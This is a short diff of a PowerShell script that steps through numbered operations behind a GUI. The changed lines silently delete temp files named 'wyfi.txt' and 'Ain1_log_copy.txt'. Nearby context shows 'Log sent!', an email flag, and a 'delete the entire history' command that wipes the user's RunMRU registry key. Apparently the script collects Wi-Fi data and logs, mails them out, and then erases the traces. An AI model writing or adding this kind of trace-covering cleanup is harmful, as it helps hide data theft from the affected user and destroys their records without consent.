@@ -442,8 +442,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 # Add-Type -AssemblyName PresentationFramework
                 # [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
             }
+            Remove-Item "$env:TEMP\wyfi.txt" -Force -ErrorAction SilentlyContinue
             $textBlock.Text = "Operation $step is done. " 
-
             SetEmailSentFalse
         }
         3 {
@@ -680,6 +680,8 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             }
             $textBlock.Text = "Log sent!"
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\Ain1_log_copy.txt" -Force -ErrorAction SilentlyContinue
+
 
             #delete the entire history
             reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
